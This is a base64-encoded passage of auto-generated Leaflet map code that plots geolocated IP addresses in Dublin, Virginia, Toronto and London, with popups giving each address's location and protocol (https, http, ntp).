iMmQ4NzNlYzJiYjdhIiBzdHlsZT0id2lkdGg6IDEwMC4wJTsgaGVpZ2h0OiAxMDAuMCU7Ij5Db3VudHJ5Q29kZT1JRSwgQ291bnRyeU5hbWU9SXJlbGFuZCwgU3RhdGU9TGVpbnN0ZXIsIENpdHk9RHVibGluLCBMb25naXR1ZGU9LTYuMjQ4OSwgTGF0aXR1ZGU9NTMuMzMzMTxicj41Mi4xOC4yMTAuMjE1PGJyPnByb3RvY29sPWh0dHBzPC9kaXY+YClbMF07CiAgICAgICAgICAgICAgICBwb3B1cF82NzExMjY3NDI5MzI0MzcyODUxZDE1ZjEwYjlmZWY0ZC5zZXRDb250ZW50KGh0bWxfYTU5ZDEwZDZmNmNiNDNiYjk5NWIyZDg3M2VjMmJiN2EpOwogICAgICAgICAgICAKCiAgICAgICAgICAgIG1hcmtlcl9lNjk4ODk3Nzc3NDM0ZjU0YjY0MDY2NWMzNjYzM2JmYi5iaW5kUG9wdXAocG9wdXBfNjcxMTI2NzQyOTMyNDM3Mjg1MWQxNWYxMGI5ZmVmNGQpCiAgICAgICAgICAgIDsKCiAgICAgICAgICAgIAogICAgICAgIAogICAgCiAgICAgICAgbWFya2VyX2U2OTg4OTc3Nzc0MzRmNTRiNjQwNjY1YzM2NjMzYmZiLmJpbmRUb29sdGlwKAogICAgICAgICAgICBgPGRpdj5gCiAgICAgICAgICAgICsgYER1YmxpbiwgSXJlbGFuZCwgcHJvdG9jb2w9aHR0cHNgICsgYDwvZGl2PmAsCiAgICAgICAgICAgIHsic3RpY2t5IjogdHJ1ZX0KICAgICAgICApOwogICAgICAgIAogICAgCiAgICAgICAgdmFyIG1hcmtlcl83OTFlYjY5NmVjZjM0YjQ2YWUwY2FjOWJiMjA3MjYxNiA9IEwubWFya2VyKAogICAgICAgICAgICBbMzguNzE2MywgLTc4LjE3MDRdLAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpY29uOiBuZXcgTC5JY29uLkRlZmF1bHQoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICApLmFkZFRvKG1hcF82MjFkYTNkNzMzZDY0OTMwOTEzYmNiZjhkN2QwZjZkNSk7CiAgICAgICAgCiAgICAKCiAgICAgICAgICAgICAgICB2YXIgaWNvbl83ZTYyMGM1YTNkODc0MzJiYTVlZGFkOTQ3NDc1YjU0OSA9IEwuQXdlc29tZU1hcmtlcnMuaWNvbih7CiAgICAgICAgICAgICAgICAgICAgaWNvbjogJ2luZm8tc2lnbicsCiAgICAgICAgICAgICAgICAgICAgaWNvbkNvbG9yOiAnd2hpdGUnLAogICAgICAgICAgICAgICAgICAgIG1hcmtlckNvbG9yOiAnYmx1ZScsCiAgICAgICAgICAgICAgICAgICAgcHJlZml4OiAnZ2x5cGhpY29uJywKICAgICAgICAgICAgICAgICAgICBleHRyYUNsYXNzZXM6ICdmYS1yb3RhdGUtMCcKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIG1hcmtlcl83OTFlYjY5NmVjZjM0YjQ2YWUwY2FjOWJiMjA3MjYxNi5zZXRJY29uKGljb25fN2U2MjBjNWEzZDg3NDMyYmE1ZWRhZDk0NzQ3NWI1NDkpOwogICAgICAgICAgICAKICAgIAogICAgICAgICAgICB2YXIgcG9wdXBfMWM1OWUzNzUxYWYxNGRkN2EyMzJlOGJhY2JkN2U5ODYgPSBMLnBvcHVwKHttYXhXaWR0aDogJzMwMCcKICAgICAgICAgICAgCiAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB2YXIgaHRtbF85NTllZDRmMDFiMTM0NmVkOGY1NjQwOWY5NzkxZGJmNSA9ICQoYDxkaXYgaWQ9Imh0bWxfOTU5ZWQ0ZjAxYjEzNDZlZDhmNTY0MDlmOTc5MWRiZjUiIHN0eWxlPSJ3aWR0aDogMTAwLjAlOyBoZWlnaHQ6IDEwMC4wJTsiPkNvdW50cnlDb2RlPVVTLCBDb3VudHJ5TmFtZT1Vbml0ZWQgU3RhdGVzLCBTdGF0ZT1WaXJnaW5pYSwgQ2l0eT1XYXNoaW5ndG9uLCBMb25naXR1ZGU9LTc4LjE3MDQsIExhdGl0dWRlPTM4LjcxNjM8YnI+NTIuMTY4LjUwLjc5PGJyPnByb3RvY29sPWh0dHA8L2Rpdj5gKVswXTsKICAgICAgICAgICAgICAgIHBvcHVwXzFjNTllMzc1MWFmMTRkZDdhMjMyZThiYWNiZDdlOTg2LnNldENvbnRlbnQoaHRtbF85NTllZDRmMDFiMTM0NmVkOGY1NjQwOWY5NzkxZGJmNSk7CiAgICAgICAgICAgIAoKICAgICAgICAgICAgbWFya2VyXzc5MWViNjk2ZWNmMzRiNDZhZTBjYWM5YmIyMDcyNjE2LmJpbmRQb3B1cChwb3B1cF8xYzU5ZTM3NTFhZjE0ZGQ3YTIzMmU4YmFjYmQ3ZTk4NikKICAgICAgICAgICAgOwoKICAgICAgICAgICAgCiAgICAgICAgCiAgICAKICAgICAgICBtYXJrZXJfNzkxZWI2OTZlY2YzNGI0NmFlMGNhYzliYjIwNzI2MTYuYmluZFRvb2x0aXAoCiAgICAgICAgICAgIGA8ZGl2PmAKICAgICAgICAgICAgKyBgV2FzaGluZ3RvbiwgVW5pdGVkIFN0YXRlcywgcHJvdG9jb2w9aHR0cGAgKyBgPC9kaXY+YCwKICAgICAgICAgICAgeyJzdGlja3kiOiB0cnVlfQogICAgICAgICk7CiAgICAgICAgCiAgICAKICAgICAgICB2YXIgbWFya2VyX2RmNzk2MTU2ZWE0MDQ5MWQ4ZTNkMmQ0ZGQ5NWNkYmRjID0gTC5tYXJrZXIoCiAgICAgICAgICAgIFs0My42NjU1LCAtNzkuNDIwNF0sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGljb246IG5ldyBMLkljb24uRGVmYXVsdCgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICkuYWRkVG8obWFwXzYyMWRhM2Q3MzNkNjQ5MzA5MTNiY2JmOGQ3ZDBmNmQ1KTsKICAgICAgICAKICAgIAoKICAgICAgICAgICAgICAgIHZhciBpY29uX2ZlZDZmOTI0OGEyMDQ1NjliOTQ3MmViNGJhYjYxOTQwID0gTC5Bd2Vzb21lTWFya2Vycy5pY29uKHsKICAgICAgICAgICAgICAgICAgICBpY29uOiAnaW5mby1zaWduJywKICAgICAgICAgICAgICAgICAgICBpY29uQ29sb3I6ICd3aGl0ZScsCiAgICAgICAgICAgICAgICAgICAgbWFya2VyQ29sb3I6ICdibHVlJywKICAgICAgICAgICAgICAgICAgICBwcmVmaXg6ICdnbHlwaGljb24nLAogICAgICAgICAgICAgICAgICAgIGV4dHJhQ2xhc3NlczogJ2ZhLXJvdGF0ZS0wJwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgbWFya2VyX2RmNzk2MTU2ZWE0MDQ5MWQ4ZTNkMmQ0ZGQ5NWNkYmRjLnNldEljb24oaWNvbl9mZWQ2ZjkyNDhhMjA0NTY5Yjk0NzJlYjRiYWI2MTk0MCk7CiAgICAgICAgICAgIAogICAgCiAgICAgICAgICAgIHZhciBwb3B1cF9mYTRiMTY5NzI4OWU0ZjY0YTc1NGIwZGZkNGM0Y2MwNCA9IEwucG9wdXAoe21heFdpZHRoOiAnMzAwJwogICAgICAgICAgICAKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAKICAgICAgICAgICAgICAgIHZhciBodG1sXzFlOTk1NjdmYWZlMDQ1ODE5M2FjYTFkMDZkNTA1ZWUzID0gJChgPGRpdiBpZD0iaHRtbF8xZTk5NTY3ZmFmZTA0NTgxOTNhY2ExZDA2ZDUwNWVlMyIgc3R5bGU9IndpZHRoOiAxMDAuMCU7IGhlaWdodDogMTAwLjAlOyI+Q291bnRyeUNvZGU9Q0EsIENvdW50cnlOYW1lPUNhbmFkYSwgU3RhdGU9T250YXJpbywgQ2l0eT1Ub3JvbnRvLCBMb25naXR1ZGU9LTc5LjQyMDQsIExhdGl0dWRlPTQzLjY2NTU8YnI+NDAuODUuMjMyLjY0PGJyPnByb3RvY29sPWh0dHBzPC9kaXY+YClbMF07CiAgICAgICAgICAgICAgICBwb3B1cF9mYTRiMTY5NzI4OWU0ZjY0YTc1NGIwZGZkNGM0Y2MwNC5zZXRDb250ZW50KGh0bWxfMWU5OTU2N2ZhZmUwNDU4MTkzYWNhMWQwNmQ1MDVlZTMpOwogICAgICAgICAgICAKCiAgICAgICAgICAgIG1hcmtlcl9kZjc5NjE1NmVhNDA0OTFkOGUzZDJkNGRkOTVjZGJkYy5iaW5kUG9wdXAocG9wdXBfZmE0YjE2OTcyODllNGY2NGE3NTRiMGRmZDRjNGNjMDQpCiAgICAgICAgICAgIDsKCiAgICAgICAgICAgIAogICAgICAgIAogICAgCiAgICAgICAgbWFya2VyX2RmNzk2MTU2ZWE0MDQ5MWQ4ZTNkMmQ0ZGQ5NWNkYmRjLmJpbmRUb29sdGlwKAogICAgICAgICAgICBgPGRpdj5gCiAgICAgICAgICAgICsgYFRvcm9udG8sIENhbmFkYSwgcHJvdG9jb2w9aHR0cHNgICsgYDwvZGl2PmAsCiAgICAgICAgICAgIHsic3RpY2t5IjogdHJ1ZX0KICAgICAgICApOwogICAgICAgIAogICAgCiAgICAgICAgdmFyIG1hcmtlcl8xYTM4NTI4NjczNWM0YjNiYTZmYTQzMTExODQ4YzdmNCA9IEwubWFya2VyKAogICAgICAgICAgICBbNTEuNTE0MiwgLTAuMDkzMV0sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGljb246IG5ldyBMLkljb24uRGVmYXVsdCgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICkuYWRkVG8obWFwXzYyMWRhM2Q3MzNkNjQ5MzA5MTNiY2JmOGQ3ZDBmNmQ1KTsKICAgICAgICAKICAgIAoKICAgICAgICAgICAgICAgIHZhciBpY29uXzljOGJhZTA5ZmEyMTQ4ODM4N2M3MTIwM2E0MGYyNWFjID0gTC5Bd2Vzb21lTWFya2Vycy5pY29uKHsKICAgICAgICAgICAgICAgICAgICBpY29uOiAnaW5mby1zaWduJywKICAgICAgICAgICAgICAgICAgICBpY29uQ29sb3I6ICd3aGl0ZScsCiAgICAgICAgICAgICAgICAgICAgbWFya2VyQ29sb3I6ICdibHVlJywKICAgICAgICAgICAgICAgICAgICBwcmVmaXg6ICdnbHlwaGljb24nLAogICAgICAgICAgICAgICAgICAgIGV4dHJhQ2xhc3NlczogJ2ZhLXJvdGF0ZS0wJwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgbWFya2VyXzFhMzg1Mjg2NzM1YzRiM2JhNmZhNDMxMTE4NDhjN2Y0LnNldEljb24oaWNvbl85YzhiYWUwOWZhMjE0ODgzODdjNzEyMDNhNDBmMjVhYyk7CiAgICAgICAgICAgIAogICAgCiAgICAgICAgICAgIHZhciBwb3B1cF8yMjRmZTliNDMwY2Q0ZWRhOWIxYjhiMDlmODZjODMwNSA9IEwucG9wdXAoe21heFdpZHRoOiAnMzAwJwogICAgICAgICAgICAKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAKICAgICAgICAgICAgICAgIHZhciBodG1sX2QyNzdmMWYyNGNkZTQ0NjRiNTRmZTY0MTRjZjE5Njc1ID0gJChgPGRpdiBpZD0iaHRtbF9kMjc3ZjFmMjRjZGU0NDY0YjU0ZmU2NDE0Y2YxOTY3NSIgc3R5bGU9IndpZHRoOiAxMDAuMCU7IGhlaWdodDogMTAwLjAlOyI+Q291bnRyeUNvZGU9R0IsIENvdW50cnlOYW1lPVVuaXRlZCBLaW5nZG9tLCBTdGF0ZT1FbmdsYW5kLCBDaXR5PUxvbmRvbiwgTG9uZ2l0dWRlPS0wLjA5MzEsIExhdGl0dWRlPTUxLjUxNDI8YnI+OTEuMTg5Ljg4LjE2Mjxicj5wcm90b2NvbD1odHRwPC9kaXY+YClbMF07CiAgICAgICAgICAgICAgICBwb3B1cF8yMjRmZTliNDMwY2Q0ZWRhOWIxYjhiMDlmODZjODMwNS5zZXRDb250ZW50KGh0bWxfZDI3N2YxZjI0Y2RlNDQ2NGI1NGZlNjQxNGNmMTk2NzUpOwogICAgICAgICAgICAKCiAgICAgICAgICAgIG1hcmtlcl8xYTM4NTI4NjczNWM0YjNiYTZmYTQzMTExODQ4YzdmNC5iaW5kUG9wdXAocG9wdXBfMjI0ZmU5YjQzMGNkNGVkYTliMWI4YjA5Zjg2YzgzMDUpCiAgICAgICAgICAgIDsKCiAgICAgICAgICAgIAogICAgICAgIAogICAgCiAgICAgICAgbWFya2VyXzFhMzg1Mjg2NzM1YzRiM2JhNmZhNDMxMTE4NDhjN2Y0LmJpbmRUb29sdGlwKAogICAgICAgICAgICBgPGRpdj5gCiAgICAgICAgICAgICsgYExvbmRvbiwgVW5pdGVkIEtpbmdkb20sIHByb3RvY29sPWh0dHBgICsgYDwvZGl2PmAsCiAgICAgICAgICAgIHsic3RpY2t5IjogdHJ1ZX0KICAgICAgICApOwogICAgICAgIAogICAgCiAgICAgICAgdmFyIG1hcmtlcl9jY2Q2ZjVmMjliNzE0MzljYTJlYmRlNGIwZmNmNjhjYiA9IEwubWFya2VyKAogICAgICAgICAgICBbMzguNzE2MywgLTc4LjE3MDRdLAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpY29uOiBuZXcgTC5JY29uLkRlZmF1bHQoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICApLmFkZFRvKG1hcF82MjFkYTNkNzMzZDY0OTMwOTEzYmNiZjhkN2QwZjZkNSk7CiAgICAgICAgCiAgICAKCiAgICAgICAgICAgICAgICB2YXIgaWNvbl8xYWM4MTY0NzQ5ZTA0YmYxYjg3MDMxNzdlM2JjMzNmZiA9IEwuQXdlc29tZU1hcmtlcnMuaWNvbih7CiAgICAgICAgICAgICAgICAgICAgaWNvbjogJ2luZm8tc2lnbicsCiAgICAgICAgICAgICAgICAgICAgaWNvbkNvbG9yOiAnd2hpdGUnLAogICAgICAgICAgICAgICAgICAgIG1hcmtlckNvbG9yOiAnYmx1ZScsCiAgICAgICAgICAgICAgICAgICAgcHJlZml4OiAnZ2x5cGhpY29uJywKICAgICAgICAgICAgICAgICAgICBleHRyYUNsYXNzZXM6ICdmYS1yb3RhdGUtMCcKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIG1hcmtlcl9jY2Q2ZjVmMjliNzE0MzljYTJlYmRlNGIwZmNmNjhjYi5zZXRJY29uKGljb25fMWFjODE2NDc0OWUwNGJmMWI4NzAzMTc3ZTNiYzMzZmYpOwogICAgICAgICAgICAKICAgIAogICAgICAgICAgICB2YXIgcG9wdXBfOWY5OWM3NTE5ZDVlNGMyNmFhZDczMTlhNGVlM2RlMTIgPSBMLnBvcHVwKHttYXhXaWR0aDogJzMwMCcKICAgICAgICAgICAgCiAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB2YXIgaHRtbF83NTU2MjZmMTQ1OTg0YmE0YjI3ZWE1NTliZGJlMzA1YyA9ICQoYDxkaXYgaWQ9Imh0bWxfNzU1NjI2ZjE0NTk4NGJhNGIyN2VhNTU5YmRiZTMwNWMiIHN0eWxlPSJ3aWR0aDogMTAwLjAlOyBoZWlnaHQ6IDEwMC4wJTsiPkNvdW50cnlDb2RlPVVTLCBDb3VudHJ5TmFtZT1Vbml0ZWQgU3RhdGVzLCBTdGF0ZT1WaXJnaW5pYSwgQ2l0eT1XYXNoaW5ndG9uLCBMb25naXR1ZGU9LTc4LjE3MDQsIExhdGl0dWRlPTM4LjcxNjM8YnI+MTMuNjguMTY1LjY0PGJyPnByb3RvY29sPWh0dHBzPC9kaXY+YClbMF07CiAgICAgICAgICAgICAgICBwb3B1cF85Zjk5Yzc1MTlkNWU0YzI2YWFkNzMxOWE0ZWUzZGUxMi5zZXRDb250ZW50KGh0bWxfNzU1NjI2ZjE0NTk4NGJhNGIyN2VhNTU5YmRiZTMwNWMpOwogICAgICAgICAgICAKCiAgICAgICAgICAgIG1hcmtlcl9jY2Q2ZjVmMjliNzE0MzljYTJlYmRlNGIwZmNmNjhjYi5iaW5kUG9wdXAocG9wdXBfOWY5OWM3NTE5ZDVlNGMyNmFhZDczMTlhNGVlM2RlMTIpCiAgICAgICAgICAgIDsKCiAgICAgICAgICAgIAogICAgICAgIAogICAgCiAgICAgICAgbWFya2VyX2NjZDZmNWYyOWI3MTQzOWNhMmViZGU0YjBmY2Y2OGNiLmJpbmRUb29sdGlwKAogICAgICAgICAgICBgPGRpdj5gCiAgICAgICAgICAgICsgYFdhc2hpbmd0b24sIFVuaXRlZCBTdGF0ZXMsIHByb3RvY29sPWh0dHBzYCArIGA8L2Rpdj5gLAogICAgICAgICAgICB7InN0aWNreSI6IHRydWV9CiAgICAgICAgKTsKICAgICAgICAKICAgIAogICAgICAgIHZhciBtYXJrZXJfYWRiNzEwN2NkMDk5NDc2NDgzOTY0MTU1MjI5Y2EwZjggPSBMLm1hcmtlcigKICAgICAgICAgICAgWzQzLjY2NTUsIC03OS40MjA0XSwKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWNvbjogbmV3IEwuSWNvbi5EZWZhdWx0KCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgKS5hZGRUbyhtYXBfNjIxZGEzZDczM2Q2NDkzMDkxM2JjYmY4ZDdkMGY2ZDUpOwogICAgICAgIAogICAgCgogICAgICAgICAgICAgICAgdmFyIGljb25fMjUxYmFiM2E5MWI5NDIxY2EzNjUzMDViYjdmZTJkYjYgPSBMLkF3ZXNvbWVNYXJrZXJzLmljb24oewogICAgICAgICAgICAgICAgICAgIGljb246ICdpbmZvLXNpZ24nLAogICAgICAgICAgICAgICAgICAgIGljb25Db2xvcjogJ3doaXRlJywKICAgICAgICAgICAgICAgICAgICBtYXJrZXJDb2xvcjogJ2JsdWUnLAogICAgICAgICAgICAgICAgICAgIHByZWZpeDogJ2dseXBoaWNvbicsCiAgICAgICAgICAgICAgICAgICAgZXh0cmFDbGFzc2VzOiAnZmEtcm90YXRlLTAnCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICBtYXJrZXJfYWRiNzEwN2NkMDk5NDc2NDgzOTY0MTU1MjI5Y2EwZjguc2V0SWNvbihpY29uXzI1MWJhYjNhOTFiOTQyMWNhMzY1MzA1YmI3ZmUyZGI2KTsKICAgICAgICAgICAgCiAgICAKICAgICAgICAgICAgdmFyIHBvcHVwXzk3NjEzZDY1ZmFhZTQxMjdhMzAwMDY5NDQ0ZTY5NmZlID0gTC5wb3B1cCh7bWF4V2lkdGg6ICczMDAnCiAgICAgICAgICAgIAogICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgdmFyIGh0bWxfMzVmZmIxOTMwMmVmNGI4OGFkZjA1YjM4MGRkOGQ0ZWEgPSAkKGA8ZGl2IGlkPSJodG1sXzM1ZmZiMTkzMDJlZjRiODhhZGYwNWIzODBkZDhkNGVhIiBzdHlsZT0id2lkdGg6IDEwMC4wJTsgaGVpZ2h0OiAxMDAuMCU7Ij5Db3VudHJ5Q29kZT1DQSwgQ291bnRyeU5hbWU9Q2FuYWRhLCBTdGF0ZT1PbnRhcmlvLCBDaXR5PVRvcm9udG8sIExvbmdpdHVkZT0tNzkuNDIwNCwgTGF0aXR1ZGU9NDMuNjY1NTxicj4xMy43MS4xNzIuMTMwPGJyPnByb3RvY29sPWh0dHBzPC9kaXY+YClbMF07CiAgICAgICAgICAgICAgICBwb3B1cF85NzYxM2Q2NWZhYWU0MTI3YTMwMDA2OTQ0NGU2OTZmZS5zZXRDb250ZW50KGh0bWxfMzVmZmIxOTMwMmVmNGI4OGFkZjA1YjM4MGRkOGQ0ZWEpOwogICAgICAgICAgICAKCiAgICAgICAgICAgIG1hcmtlcl9hZGI3MTA3Y2QwOTk0NzY0ODM5NjQxNTUyMjljYTBmOC5iaW5kUG9wdXAocG9wdXBfOTc2MTNkNjVmYWFlNDEyN2EzMDAwNjk0NDRlNjk2ZmUpCiAgICAgICAgICAgIDsKCiAgICAgICAgICAgIAogICAgICAgIAogICAgCiAgICAgICAgbWFya2VyX2FkYjcxMDdjZDA5OTQ3NjQ4Mzk2NDE1NTIyOWNhMGY4LmJpbmRUb29sdGlwKAogICAgICAgICAgICBgPGRpdj5gCiAgICAgICAgICAgICsgYFRvcm9udG8sIENhbmFkYSwgcHJvdG9jb2w9aHR0cHNgICsgYDwvZGl2PmAsCiAgICAgICAgICAgIHsic3RpY2t5IjogdHJ1ZX0KICAgICAgICApOwogICAgICAgIAogICAgCiAgICAgICAgdmFyIG1hcmtlcl80MDk3NmQ5MWY0N2U0YjQ3YmNjNjFkOGE2ZGYzMzM0YSA9IEwubWFya2VyKAogICAgICAgICAgICBbNDMuNjY1NSwgLTc5LjQyMDRdLAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpY29uOiBuZXcgTC5JY29uLkRlZmF1bHQoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICApLmFkZFRvKG1hcF82MjFkYTNkNzMzZDY0OTMwOTEzYmNiZjhkN2QwZjZkNSk7CiAgICAgICAgCiAgICAKCiAgICAgICAgICAgICAgICB2YXIgaWNvbl9iZDY3MWUwOGRhOTI0YjI3YjBlODQwYzViMzZhNTBiYiA9IEwuQXdlc29tZU1hcmtlcnMuaWNvbih7CiAgICAgICAgICAgICAgICAgICAgaWNvbjogJ2luZm8tc2lnbicsCiAgICAgICAgICAgICAgICAgICAgaWNvbkNvbG9yOiAnd2hpdGUnLAogICAgICAgICAgICAgICAgICAgIG1hcmtlckNvbG9yOiAnYmx1ZScsCiAgICAgICAgICAgICAgICAgICAgcHJlZml4OiAnZ2x5cGhpY29uJywKICAgICAgICAgICAgICAgICAgICBleHRyYUNsYXNzZXM6ICdmYS1yb3RhdGUtMCcKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIG1hcmtlcl80MDk3NmQ5MWY0N2U0YjQ3YmNjNjFkOGE2ZGYzMzM0YS5zZXRJY29uKGljb25fYmQ2NzFlMDhkYTkyNGIyN2IwZTg0MGM1YjM2YTUwYmIpOwogICAgICAgICAgICAKICAgIAogICAgICAgICAgICB2YXIgcG9wdXBfZTY3ZjJmZjRjZWM4NGY2NDhmNGY4NGRjOTM1ODEyMjMgPSBMLnBvcHVwKHttYXhXaWR0aDogJzMwMCcKICAgICAgICAgICAgCiAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB2YXIgaHRtbF81ZTgyNWMyM2YyNTU0OTgxOGVmN2I4ZWU5MTBiODVmZiA9ICQoYDxkaXYgaWQ9Imh0bWxfNWU4MjVjMjNmMjU1NDk4MThlZjdiOGVlOTEwYjg1ZmYiIHN0eWxlPSJ3aWR0aDogMTAwLjAlOyBoZWlnaHQ6IDEwMC4wJTsiPkNvdW50cnlDb2RlPUNBLCBDb3VudHJ5TmFtZT1DYW5hZGEsIFN0YXRlPU9udGFyaW8sIENpdHk9VG9yb250bywgTG9uZ2l0dWRlPS03OS40MjA0LCBMYXRpdHVkZT00My42NjU1PGJyPjEzLjcxLjE3Mi4xMzA8YnI+cHJvdG9jb2w9aHR0cHM8L2Rpdj5gKVswXTsKICAgICAgICAgICAgICAgIHBvcHVwX2U2N2YyZmY0Y2VjODRmNjQ4ZjRmODRkYzkzNTgxMjIzLnNldENvbnRlbnQoaHRtbF81ZTgyNWMyM2YyNTU0OTgxOGVmN2I4ZWU5MTBiODVmZik7CiAgICAgICAgICAgIAoKICAgICAgICAgICAgbWFya2VyXzQwOTc2ZDkxZjQ3ZTRiNDdiY2M2MWQ4YTZkZjMzMzRhLmJpbmRQb3B1cChwb3B1cF9lNjdmMmZmNGNlYzg0ZjY0OGY0Zjg0ZGM5MzU4MTIyMykKICAgICAgICAgICAgOwoKICAgICAgICAgICAgCiAgICAgICAgCiAgICAKICAgICAgICBtYXJrZXJfNDA5NzZkOTFmNDdlNGI0N2JjYzYxZDhhNmRmMzMzNGEuYmluZFRvb2x0aXAoCiAgICAgICAgICAgIGA8ZGl2PmAKICAgICAgICAgICAgKyBgVG9yb250bywgQ2FuYWRhLCBwcm90b2NvbD1odHRwc2AgKyBgPC9kaXY+YCwKICAgICAgICAgICAgeyJzdGlja3kiOiB0cnVlfQogICAgICAgICk7CiAgICAgICAgCiAgICAKICAgICAgICB2YXIgbWFya2VyXzFmMWFlY2I4MTFhNDRkZTE5YTIyMDI4NWI2M2E0MDJlID0gTC5tYXJrZXIoCiAgICAgICAgICAgIFs1MS41MTQyLCAtMC4wOTMxXSwKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWNvbjogbmV3IEwuSWNvbi5EZWZhdWx0KCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgKS5hZGRUbyhtYXBfNjIxZGEzZDczM2Q2NDkzMDkxM2JjYmY4ZDdkMGY2ZDUpOwogICAgICAgIAogICAgCgogICAgICAgICAgICAgICAgdmFyIGljb25fNmQwOWRkY2I3Njg0NGM2ZmFkYjY3YjUwNDBkNWNlZTMgPSBMLkF3ZXNvbWVNYXJrZXJzLmljb24oewogICAgICAgICAgICAgICAgICAgIGljb246ICdpbmZvLXNpZ24nLAogICAgICAgICAgICAgICAgICAgIGljb25Db2xvcjogJ3doaXRlJywKICAgICAgICAgICAgICAgICAgICBtYXJrZXJDb2xvcjogJ2JsdWUnLAogICAgICAgICAgICAgICAgICAgIHByZWZpeDogJ2dseXBoaWNvbicsCiAgICAgICAgICAgICAgICAgICAgZXh0cmFDbGFzc2VzOiAnZmEtcm90YXRlLTAnCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICBtYXJrZXJfMWYxYWVjYjgxMWE0NGRlMTlhMjIwMjg1YjYzYTQwMmUuc2V0SWNvbihpY29uXzZkMDlkZGNiNzY4NDRjNmZhZGI2N2I1MDQwZDVjZWUzKTsKICAgICAgICAgICAgCiAgICAKICAgICAgICAgICAgdmFyIHBvcHVwX2JjZGI2NGMwNjM0NTQ0NzVhOWQ5YzU4MGE3M2FjYWNkID0gTC5wb3B1cCh7bWF4V2lkdGg6ICczMDAnCiAgICAgICAgICAgIAogICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgdmFyIGh0bWxfNzMxNWIzYjcyOWYyNGY5Yjk2OTgzNzc2YjFlMTA2NjAgPSAkKGA8ZGl2IGlkPSJodG1sXzczMTViM2I3MjlmMjRmOWI5Njk4Mzc3NmIxZTEwNjYwIiBzdHlsZT0id2lkdGg6IDEwMC4wJTsgaGVpZ2h0OiAxMDAuMCU7Ij5Db3VudHJ5Q29kZT1HQiwgQ291bnRyeU5hbWU9VW5pdGVkIEtpbmdkb20sIFN0YXRlPUVuZ2xhbmQsIENpdHk9TG9uZG9uLCBMb25naXR1ZGU9LTAuMDkzMSwgTGF0aXR1ZGU9NTEuNTE0Mjxicj45MS4xODkuOTQuNDxicj5wcm90b2NvbD1udHA8L2Rpdj5gKVswXTsKICAgICAgICAgICAgICAgIHBvcHVwX2JjZGI2NGMwNjM0NTQ0NzVhOWQ5YzU4MGE3M2FjYWNkLnNldENvbnRlbnQoaHRtbF83MzE1YjNiNzI5ZjI0ZjliOTY5ODM3NzZiMWUxMDY2MCk7CiAgICAgICAgICAgIAoKICAgICAgICAgICAgbWFya2VyXzFmMWFlY2I4MTFhNDRkZTE5YTIyMDI4NWI2M2E0MDJlLmJpbmRQb3B1cChwb3B1cF9iY2RiNjRjMDYzNDU0NDc1YTlkOWM1ODBhNzNhY2FjZCkKICAgICAgICAgICAgOwoKICAgICAgICAgICAgCiAgICAgICAgCiAgICAKICAgICAgICBtYXJrZXJfMWYxYWVjYjgxMWE0NGRlMTlhMjIwMjg1YjYzYTQwMmUuYmluZFRvb2x0aXAoCiAgICAgICAgICAgIGA8ZGl2PmAKICAgICAgICAgICAgKyBgTG9uZG9uLCBVbml0ZWQgS2luZ2RvbSwgcHJvdG9jb2w9bnRwYCArIGA8L2Rpdj5gLAogICAgICAgICAgICB7InN0aWNreSI6IHRydWV9CiAgICAgICAgKTsKICAgICAgICAKICAgIAogICAgICAgIHZhciBtYXJrZXJfYmQyYWZkMWUyNzA3NGMzNjg3MzBhNDNhYTIzMGNkN2QgPSBMLm1hcmtlcigKICAgICAgICAgICAgWzQzLjY2NTUsIC03OS40MjA0XSwKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWNvbjogbmV3IEwuSWNvbi5EZWZhdWx0KCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgKS5hZGRUbyhtYXBfNjIxZGEzZDczM2Q2NDkzMDkxM2JjYmY4ZDdkMGY2ZDUpOwogICAgICAgIAogICAgCgogICAgICAgICAgICAgICAgdmFyIGljb25fMDBjOGE0NmIzY2M3NDg5ZWIzMWQwMzJmNDQzNTMyMzIgPSBMLkF3ZXNvbWVNYXJrZXJzLmljb24oewogICAgICAgICAgICAgICAgICAgIGljb246ICdpbmZvLXNpZ24nLAogICAgICAgICAgICAgICAgICAgIGljb25Db2xvcjogJ3doaXRlJywKICAgICAgICAgICAgICAgICAgICBtYXJrZXJDb2xvcjogJ2JsdWUnLAogICAgICAgICAgICAgICAgICAgIHByZWZpeDogJ2dseXBoaWNvbicsCiAgICAgICAgICAgICAgICAgICAgZXh0cmFDbGFzc2VzOiAnZmEtcm90YXRlLTAnCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICBtYXJrZXJfYmQyYWZkMWUyNzA3NGMzNjg3MzBhNDNhYTIzMGNkN2